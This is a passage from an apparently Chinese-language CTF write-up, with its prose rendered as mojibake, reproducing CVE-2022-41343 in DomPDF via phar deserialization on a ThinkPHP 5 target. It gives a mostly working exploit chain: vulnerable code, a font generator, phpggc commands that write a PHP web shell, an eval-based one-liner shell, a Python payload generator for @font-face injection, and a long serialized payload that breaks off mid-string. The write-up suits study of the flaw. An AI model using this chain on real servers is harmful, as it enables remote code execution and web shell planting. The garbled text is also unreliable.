¹æ®ç‰ˆæœ¬å·å»googleæœç´¢æ¼æ´çš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥æœåˆ°ä¸€äº›æ¼æ´åˆ†ææ–‡ç« çš„</p><p><a href="https://www.ctfiot.com/79602.html">DomPDFåº“ååºåˆ—åŒ–RCEæ¼æ´åˆ†æ</a></p><p>è¿™ä¸¤ç¯‡æ–‡ç« éƒ½å¯ä»¥è¿›è¡Œå‚è€ƒ</p><p><strong>æ¼æ´ç‚¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">        <span class="variable">$entry</span>[<span class="variable">$styleString</span>] = <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Download the remote file</span></span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">        <span class="variable">$allowed_protocols</span> = <span class="variable language_">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">getAllowedProtocols</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$protocol</span>, <span class="variable">$allowed_protocols</span>)) &#123;</span><br><span class="line">            <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Permission denied on <span class="subst">$remoteFile</span>. The communication protocol is not supported.&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$allowed_protocols</span>[<span class="variable">$protocol</span>][<span class="string">&quot;rules&quot;</span>] <span class="keyword">as</span> <span class="variable">$rule</span>) &#123;</span><br><span class="line">            [<span class="variable">$result</span>, <span class="variable">$message</span>] = <span class="variable">$rule</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Error loading <span class="subst">$remoteFile</span>: <span class="subst">$message</span>&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @<span class="title class_">Helpers</span>::<span class="title function_ invoke__">getFileContent</span>(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remoteFileContent</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426111849366.png" alt="image-20230426111849366"></p><p>ä¸»è¦é”™è¯¯å°±åœ¨è¿™ä¸€æ®µï¼Œåœ¨<code>if ($result !== true)</code>åå¹¶æ²¡æœ‰returnæ¥ç»“æŸï¼Œå› æ­¤å¯ä»¥è¿›å…¥<code>getFileContent</code>å‡½æ•°ï¼Œè¿™æ„å‘³ç€å¯ä»¥ä½¿ç”¨ä»»ä½•åè®®ï¼Œç„¶ååŒ…æ‹¬ä¸»è§’phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileContent</span>(<span class="params"><span class="variable">$uri</span>, <span class="variable">$context</span> = <span class="literal">null</span>, <span class="variable">$offset</span> = <span class="number">0</span>, <span class="variable">$maxlen</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="literal">null</span>;</span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$uri</span>);</span><br><span class="line">        <span class="variable">$is_local_path</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;&quot;</span>, <span class="string">&quot;file://&quot;</span>, <span class="string">&quot;phar://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$can_use_curl</span> = <span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$protocol</span>), [<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>([<span class="built_in">self</span>::<span class="variable language_">class</span>, <span class="string">&#x27;record_warnings&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is_local_path</span> || <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;allow_url_fopen&#x27;</span>) || !<span class="variable">$can_use_curl</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$is_local_path</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$uri</span> = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">encodeURI</span>(<span class="variable">$uri</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$maxlen</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>, <span class="variable">$maxlen</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uri</span>, <span class="literal">false</span>, <span class="variable">$context</span>, <span class="variable">$offset</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="variable">$result</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$http_response_header</span>)) &#123;</span><br><span class="line">                    <span class="variable">$headers</span> = <span class="variable">$http_response_header</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$can_use_curl</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;curl_exec&#x27;</span>)) &#123;</span><br><span class="line">         [...]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$content</span>, <span class="variable">$headers</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426112016718.png" alt="image-20230426112016718"></p><p>è¿™é‡Œå°±æ˜¯è§¦å‘pharååºåˆ—åŒ–çš„å…³é”®äº†</p><p>å¯ä»¥çœ‹åˆ°<code>file_get_contents</code>ï¼Œä¹‹åå°±ä¸èµ˜è¿°äº†ï¼Œæ¥ä¸‹æ¥è§£é‡Šä¸€ä¸‹å¤ç°æ­¥éª¤ï¼Œç”±äºé¢˜ç›®æ˜¯åŸºäºTP5çš„ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å¯ä»¥æ‰“TP5çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚<br>é¦–å…ˆæˆ‘ä»¬è¦ç”Ÿæˆæ¶æ„å­—ä½“æ–‡ä»¶ï¼Œç”¨ä»¥ä¸‹è„šæœ¬å»ç”Ÿæˆï¼š</p><p>è„šæœ¬æ˜¯ä¸Šé¢çš„åˆ†ææ–‡ç« é‡Œå†™çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sys.stdout.buffer.write(do_generate_font())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_generate_font</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    fd, fn = tempfile.mkstemp(suffix=<span class="string">&quot;.ttf&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    font = fontforge.font()</span><br><span class="line">    font.copyright = <span class="string">&quot;DUMMY FONT&quot;</span></span><br><span class="line">    font.generate(fn)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    os.unlink(fn)</span><br><span class="line">    result = res</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚ç‡ä¼šæŠ¥é”™fontæ¨¡å—æ²¡æ‰¾åˆ°<code>apt-get install python3-fontforge</code>å®‰è£…ä¸€ä¸‹<br>ä¹‹åå¯ä»¥ç”Ÿæˆå¯ä»¥fontï¼š</p><p><img src="../images/image-20230426114443537.png" alt="image-20230426114443537"></p><p>å°±æ˜¯æŠŠpythonè„šæœ¬ç”Ÿæˆçš„å†…å®¹ç»™åˆ°<code>font.ttf</code>é‡Œé¢</p><p><strong>ç„¶åå°±å¼€å§‹ä½¿ç”¨phpggcæ¥ç”Ÿæˆpayload</strong></p><p>PHPGGCæ˜¯ä¸€æ¬¾èƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸»æµæ¡†æ¶çš„åºåˆ—åŒ–æµ‹è¯•payloadçš„å·¥å…·,å¯ä»¥è¯´æ˜¯ååºåˆ—åŒ–çš„æ­¦å™¨åº“,å¹³æ—¶é‡åˆ°æœ‰å…³ååºåˆ—åŒ–çš„é¢˜ç›®æ—¶å¦‚æœèƒ½å¤Ÿç†Ÿç»ƒè¿ç”¨å®ƒï¼Œå°†èŠ‚çœå¤§é‡åŠŸå¤«</p><p><code>./phpggc -l</code>    æŸ¥çœ‹å¯åˆ©ç”¨çš„ååºåˆ—åŒ–é“¾</p><p><img src="../images/image-20230426195919698.png" alt="image-20230426195919698"></p><p>è¿™é‡Œæ ¹æ®é¢˜ç›®çš„thinkphpç‰ˆæœ¬æ¥è¿›è¡Œé€‰</p><p><code>./phpggc ThinkPHP/FW1 &lt;remote_path&gt; &lt;local_path&gt;</code><br>ç”¨æ³•å¦‚ä¸Šï¼Œremote_pathæ˜¯è¦å†™å…¥é¶åœºçš„ä½ç½®ï¼Œlocal_pathæ˜¯ä½ shellæ–‡ä»¶çš„ä½ç½®ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ã€‚tp5çš„è¯å†™å…¥publicæ–‡ä»¶å¤¹ä¸‹ã€‚å› ä¸ºåªæœ‰publicæ–‡ä»¶å¤¹ä¸‹æˆ‘ä»¬å¯ä»¥è®¿é—®<br>è¿™é‡Œæˆ‘å‡†å¤‡çš„shellå¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426200140792.png" alt="image-20230426200140792"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.<span class="keyword">readonly</span>=<span class="number">0</span> phpggc ThinkPHP/RCE2 system <span class="string">&quot;echo &#x27;&lt;?php system(<span class="subst">$_GET</span>[0]); ?&gt;&#x27; &gt; /var/www/html/public/mochu7.php&quot;</span> -p phar -pp font.ttf -o font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201055420.png" alt="image-20230426201055420"></p><p><strong>ç„¶åç”¨ä¸‹é¢çš„è„šæœ¬ç”Ÿæˆpayload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">PAYLOAD_TEMPLATE_URL_ENCODED = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;%s&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">    @font-face &#123;</span></span><br><span class="line"><span class="string">        font-family:&#x27;exploit&#x27;;</span></span><br><span class="line"><span class="string">        src:url(&#x27;%s&#x27;);</span></span><br><span class="line"><span class="string">        font-weight:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">        font-style:&#x27;normal&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser( prog=<span class="string">&quot;generate_payload.py&quot;</span>,</span><br><span class="line">                      formatter_class=<span class="keyword">lambda</span> prog: argparse.HelpFormatter(prog,max_help_position=<span class="number">50</span>),</span><br><span class="line">                      epilog= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                       This script will generate payloads for CVE-2022-41343</span></span><br><span class="line"><span class="string">                      &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Polyglot File&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--path&quot;</span>, default=<span class="string">&quot;/var/www/&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base path to vendor directory (Default = /var/www/)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = get_args()</span><br><span class="line">    file = args.file.strip()</span><br><span class="line">    path = args.path.strip()</span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(file)):</span><br><span class="line">        generate_payloads(file, path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: File doesn&#x27;t exist.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payloads</span>(<span class="params">file, path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        fc = f.read()</span><br><span class="line">    b64 = base64.b64encode(fc)</span><br><span class="line">    data_uri_pure = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % b64.decode()</span><br><span class="line">    data_uri_double_encoded = <span class="string">&quot;data:text/plain;base64,%s&quot;</span> % urllib.parse.quote_plus(urllib.parse.quote_plus(b64.decode()))</span><br><span class="line">    md5 = hashlib.md5(urllib.parse.unquote(data_uri_double_encoded).encode()).hexdigest()</span><br><span class="line">    <span class="comment"># è®¡ç®—md5è¿™é‡Œï¼Œå› ä¸ºå¤§ä½¬è¿™é‡Œæ˜¯ä¸¤æ¬¡urlç¼–ç ï¼Œä½†æ˜¯ä¸Šä¼ ä¹‹åæœåŠ¡å™¨æ¥æ”¶ä¼šè§£ä¸€æ¬¡urlï¼ŒdompdfçœŸæ­£å¤„ç†çš„æ•°æ®åº”è¯¥æ˜¯ç»è¿‡ä¸€æ¬¡urlè§£ç çš„æ•°æ®ï¼Œæ‰€ä»¥è®¡ç®—md5éœ€è¦è§£ä¸€æ¬¡urlç¼–ç æ‰æ˜¯æ­£ç¡®çš„æ–‡ä»¶å</span></span><br><span class="line">    phar_uri = <span class="string">&quot;phar://%s/vendor/dompdf/dompdf/lib/fonts/exploit_normal_%s.ttf##&quot;</span> % (path,md5)</span><br><span class="line">    req1_enc = PAYLOAD_TEMPLATE_URL_ENCODED % data_uri_double_encoded</span><br><span class="line">    req2_enc = PAYLOAD_TEMPLATE_URL_ENCODED % urllib.parse.quote_plus(phar_uri)</span><br><span class="line">    req1_pure = PAYLOAD_TEMPLATE % data_uri_double_encoded</span><br><span class="line">    req2_pure = PAYLOAD_TEMPLATE % phar_uri</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_enc)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 1 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req1_pure)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;====== REQUEST 2 NOT ENCODED =======&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req2_pure)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python <span class="number">1.</span>py -p <span class="string">&quot;/var/www/html&quot;</span> font-polyglot.phar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426201328406.png" alt="image-20230426201328406"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">====== REQUEST 1 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MT